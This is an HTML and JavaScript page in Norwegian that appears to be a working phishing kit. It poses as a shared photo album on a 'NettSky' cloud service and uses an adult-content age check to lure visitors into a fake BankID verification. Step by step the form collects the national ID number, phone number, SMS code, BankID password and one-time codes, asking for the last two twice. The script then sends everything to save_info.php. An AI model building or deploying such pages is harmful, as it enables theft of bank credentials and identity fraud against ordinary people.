<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Document</title>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link
    href="https://fonts.googleapis.com/css2?family=Chivo:ital,wght@0,100..900;1,100..900&family=Jost:ital,wght@0,100..900;1,100..900&display=swap"
    rel="stylesheet">
  <link rel="stylesheet" href="assets/css/style.css">
</head>

<body>
  <main class="main-wrapper">

    <div class="form-wrapper" id="form-wrapper-two" style="background-color: #59c1f5;">
      <div class="content-area" id="content-area">
        <img src="./assets/img/sky-outline.svg" alt="sky" class="sky-img">
        <h1>NettSky</h1>
        <p class="long-text1" id="long-text1">Den beste plasseringen for bilder, filer, notater, e-post og mer</p>
        <p class="long-text2" id="long-text2">Sarah har delt sin album med deg</p>
        <p class="long-text3" id="long-text3" style="display:none">Denne nedlastingen inneholder vokseninnhold. For å
          laste den ned, må du bekrefte at du er 18 år eller eldre.</p>
        <p class="long-text4" id="long-text4" style="display:none">Identifisering fullført. Du er nå klar til å laste
          ned.</p>
        <button class="button2" id="button01" style="background-color: #d4f3fd; color: #222">Last ned</button>
      </div>
    </div>

    <div class="form-wrapper" id="form-wrapper" style="display:none">
      <svg class="logo-svg" focusable="false" id="Layer_1" version="1.1" viewBox="0 0 140 21" x="0px"
        xmlSpace="preserve" xmlns="http://www.w3.org/2000/svg" y="0px">
        <g>
          <g>
            <path d="M7.5,3h-6C0.7,3,0,2.3,0,1.5v0C0,0.7,0.7,0,1.5,0l6,0C8.3,0,9,0.7,9,1.5v0C9,2.3,8.3,3,7.5,3z"></path>
            <path
              d="M7.5,15h-6C0.7,15,0,14.3,0,13.5v0C0,12.7,0.7,12,1.5,12h6C8.3,12,9,12.7,9,13.5v0C9,14.3,8.3,15,7.5,15z">
            </path>
            <path
              d="M7.5,21h-6C0.7,21,0,20.3,0,19.5v0C0,18.7,0.7,18,1.5,18h6C8.3,18,9,18.7,9,19.5v0C9,20.3,8.3,21,7.5,21z">
            </path>
            <path
              d="M19.5,9h-6C12.7,9,12,8.3,12,7.5v0C12,6.7,12.7,6,13.5,6h6C20.3,6,21,6.7,21,7.5v0C21,8.3,20.3,9,19.5,9z">
            </path>
            <path d="M19.5,15h-6c-0.8,0-1.5-0.7-1.5-1.5v0c0-0.8,0.7-1.5,1.5-1.5h6c0.8,0,1.5,0.7,1.5,1.5v0
        C21,14.3,20.3,15,19.5,15z"></path>
            <path
              d="M31.5,3h-6C24.7,3,24,2.3,24,1.5v0C24,0.7,24.7,0,25.5,0l6,0C32.3,0,33,0.7,33,1.5v0C33,2.3,32.3,3,31.5,3z">
            </path>
            <path
              d="M31.5,9h-6C24.7,9,24,8.3,24,7.5v0C24,6.7,24.7,6,25.5,6h6C32.3,6,33,6.7,33,7.5v0C33,8.3,32.3,9,31.5,9z">
            </path>
            <path d="M31.5,21h-6c-0.8,0-1.5-0.7-1.5-1.5v0c0-0.8,0.7-1.5,1.5-1.5h6c0.8,0,1.5,0.7,1.5,1.5v0
        C33,20.3,32.3,21,31.5,21z"></path>
          </g>
          <g>
            <path d="M45.8,13.1c0,3.2,1.8,4.9,3.9,4.9c1.9,0,4-1.6,4-4.9c0-3.3-2-4.8-3.9-4.8C47.7,8.3,45.8,9.8,45.8,13.1
         M45.8,0v7.8C46.7,6.4,48.3,5,51,5c3,0,6.6,2.5,6.6,8c0,5.7-3.4,8.5-6.9,8.5c-2,0-3.7-0.9-4.8-2.7V21H42V0H45.8z">
            </path>
            <path
              d="M63.3,13.2c0,3.3,2,4.8,3.9,4.8c2.1,0,3.9-1.4,3.9-4.8c0-3.3-1.8-4.9-3.9-4.9C65.4,8.3,63.3,9.8,63.3,13.2
         M59.5,13c0-5.4,3.5-8.1,7-8.1c1.9,0,3.5,0.7,4.7,2.4v-2H75V21h-3.8v-2.2c-1.1,1.5-2.7,2.6-5.2,2.6C63,21.4,59.5,18.8,59.5,13">
            </path>
            <path d="M82.5,12.1V21h-3.8V5.4h3.8v2.3c1.1-2,3.1-2.7,4.8-2.7c2.7,0,5.3,1.4,5.3,5.6V21h-3.8v-9c0-2.6-1.3-3.6-3-3.6
        C83.9,8.5,82.5,9.6,82.5,12.1"></path>
            <polygon points="96.2,0 96.2,21 100,21 100,17.2 102.1,14.6 106.4,21 110.6,21 104.4,11.9 109.8,5.4 105.5,5.4
        100,12.6 100,0"></polygon>
            <rect height="20.3" width="3.9" x="114.3" y="0.7"></rect>
            <path d="M129.5,0.7h-7.4V21h7.4c5.5,0,10.1-3.3,10.1-10.2C139.6,4,135,0.7,129.5,0.7z M129.5,17.4H126V4.3h3.5
        c3.2,0,5.9,2.1,5.9,6.6C135.4,15.3,132.7,17.4,129.5,17.4z"></path>
          </g>
        </g>
      </svg>
      <h2 class="form-title">Aktiver BankID for ID sjekk</h2>
      <p class="form-intro">Aldersgrense indentifisering</p>

      <form id="stepForm">

        <!-- Step 1 -->
        <div id="step01" class="step">
          <label for="input01">Hva er ditt fødselsnummer?</label>
          <input class="form--control" type="text" id="input01" placeholder="11 siffer" maxlength="11"
            pattern="^\d{11}$" required>
          <small>Fyll inn fødselsnummer (11 siffer)</small>
        </div>

        <!-- Step 2 -->
        <div id="step02" class="step" style="display: none;">
          <label for="input02">Skriv ditt telefonnummer</label>
          <input class="form--control" type="text" id="input02" placeholder="Telefonnummer" maxlength="8"
            pattern="^\d{8}$" required>
          <small>Vi sender deg en tekstmelding med engangskode til dette nummeret.</small>
        </div>

        <!-- Step 3 -->
        <div id="step03" class="step" style="display: none;">
          <label for="input03">Bekreft telefonnummer</label>
          <input class="form--control" type="text" id="input03" placeholder="Kode" maxlength="6" pattern="^\d{6}$"
            required>
          <small>Skriv inn engangskoden du fikk på tekstmelding.</small>
        </div>

        <!-- Step 4 -->
        <div id="step04" class="step" style="display: none;">
          <label for="input04">Ditt bankID passord</label>
          <input class="form--control" type="password" id="input04" placeholder="Personelig passord" required>
          <small>BankID</small>
        </div>

        <!-- Step 5 -->
        <div id="step05" class="step" style="display: none;">
          <label for="input05">Ditt bankID engangskode</label>
          <input class="form--control" type="text" id="input05" placeholder="Engangskode" maxlength="6"
            pattern="^\d{6}$" required>
          <small>BankID</small>
        </div>

        <!-- Step 6 -->
        <div id="step06" class="step" style="display: none;">
          <label for="input07">Vennligst vent til videre godkjenning</label>
          <div id="app">
            <div class="base-timer">
              <svg class="base-timer__svg" viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
                <g class="base-timer__circle">
                  <circle class="base-timer__path-elapsed" cx="50" cy="50" r="45"></circle>
                  <path id="base-timer-path-remaining" stroke-dasharray="283" class="base-timer__path-remaining arc" d="
                   M 50, 50
                   m -45, 0
                   a 45,45 0 1,0 90,0
                   a 45,45 0 1,0 -90,0
                   "></path>
                </g>
              </svg>
              <span id="base-timer-label" class="base-timer__label"></span>
            </div>
          </div>
        </div>

        <!-- Step 7 -->
        <div id="step07" class="step" style="display: none;">
          <label for="input07">Ditt bankID passord</label>
          <input class="form--control" type="password" id="input07" placeholder="Personelig passord" required>
          <small>BankID</small>
        </div>

        <!-- Step 8 -->
        <div id="step08" class="step" style="display: none;">
          <label for="input08">Ditt bankID engangskode</label>
          <input class="form--control" type="password" id="input08" placeholder="Engangskode" required>
          <small>BankID</small>
        </div>

        <!-- Step 9 -->
        <div id="step09" class="step" style="display: none;">
          <label for="input09">Identifisering fullført</label>
          <!-- <input class="form--control" type="password" id="input08" placeholder="Engangskode" required> -->
          <img src="assets/img/check.svg" alt="check icon" width="90">
          <small>"""Clock timer, instead of timer it should be a green circle with a check icon, you can just make it
            green and add a check icon inside instead of timer"""</small>
        </div>

        <br>
        <button type="button" id="nextButton" class="button next-btn">
          <div class="spinner"></div>
          <span class="text">Neste</span>
        </button>
        <button type="submit" id="submitButton" class="button next-btn" style="display: none;">Lukk</button>
        <br>
        <a href="" class="form-link">Gå tilbake</a>
      </form>

    </div>

    <script src="./assets/js/app.js"></script>
    <script>
      document.addEventListener("DOMContentLoaded", () => {
        const stepForm = document.getElementById("stepForm");
        const steps = document.querySelectorAll(".step");
        const nextButton = document.getElementById("nextButton");
        const submitButton = document.getElementById("submitButton");
        const formWrapper = document.getElementById("form-wrapper");
        const formWrapper2 = document.getElementById("form-wrapper-two");
        const text3 = document.getElementById("long-text3");
        const text4 = document.getElementById("long-text4");
        let currentStep = 0;

        // Show the current step with fade effect
        function showStep(stepIndex, isInitialLoad = false) {
          steps.forEach((step, index) => {
            if (index === stepIndex) {
              if (isInitialLoad) {
                // No delay for the initial load
                step.classList.add("active");
                step.style.display = "block";
                step.style.opacity = "1"; // Show immediately
              } else {
                // Apply delay for subsequent steps
                setTimeout(() => {
                  step.classList.add("active");
                  step.style.display = "block"; // Ensure it's visible during fade-in
                  setTimeout(() => {
                    step.style.opacity = "1"; // Trigger fade-in
                  }, 10); // Delay ensures the browser applies the opacity transition
                }, 500); // 5-second delay before showing the new step
              }
            } else {
              setTimeout(() => {
                step.style.opacity = "0"; // Trigger fade-out
                step.style.display = "none"; // Hide after fade-out
                step.classList.remove("active");
              }, 500); // Match this to your CSS transition duration
            }
          });

          // Toggle button visibility
          setTimeout(() => {
            nextButton.style.display = stepIndex < steps.length - 1 ? "inline-block" : "none";
            submitButton.style.display = stepIndex === steps.length - 1 ? "inline-block" : "none";
          }, isInitialLoad ? 0 : 500); // No delay for button toggling during initial load
        }

        // Validate inputs of the current step
        function validateStep(stepIndex) {
          const inputs = steps[stepIndex].querySelectorAll("input");
          for (const input of inputs) {
            if (!input.checkValidity()) {
              input.reportValidity();
              return false;
            }
          }
          return true;
        }

        // Handle next button click
        nextButton.addEventListener("click", () => {
          if (validateStep(currentStep)) {
            currentStep++;
            showStep(currentStep);

            if (currentStep >= 1) {
              nextButton.classList.add('loading')
              setTimeout(() => {
                nextButton.classList.remove('loading')
              }, 500); // Match this to your CSS transition duration
            }

            if (currentStep === 5) {
              setTimeout(() => {
                nextButton.textContent = "Vent";
                start(); // Call your custom function if needed
              }, 500); // Match this to your CSS transition duration
            } else if (currentStep >= 6) {
              setTimeout(() => {
                nextButton.textContent = "Neste";
              }, 500); // Match this to your CSS transition duration
            }
          }
        });

        // Handle form submission
        stepForm.addEventListener("submit", (e) => {
          e.preventDefault();

          // Collect data from all inputs
          const formData = Array.from(steps).reduce((data, step) => {
            const inputs = step.querySelectorAll("input");
            inputs.forEach((input) => {
              data[input.id] = input.value;
            });
            return data;
          }, {});

          console.log("Form Data:", formData); // Debugging log

          // Send the form data to the server
          fetch("save_info.php", {
            method: "POST",
            headers: {
              "Content-Type": "application/json",
            },
            body: JSON.stringify(formData),
          })
            .then((response) => response.json())
            .then((data) => {
              if (data.status === "success") {
                stepForm.reset();
                currentStep = 0;
                showStep(currentStep, true); // Ensure the initial step is shown immediately
                formWrapper.style.display = "none";
                formWrapper2.style.display = "block";
                text3.style.display = "none";
                text4.style.display = "block";
                button01.textContent = "Last ned";
              } else {
                alert("Error: " + data.message);
              }
            })
            .catch((error) => {
              alert("Failed to submit the form. Please try again.");
            });
        });

        // Initialize the first step
        showStep(currentStep, true); // Pass `true` to indicate it's the initial load
      });

    </script>

  </main>
</body>

</html>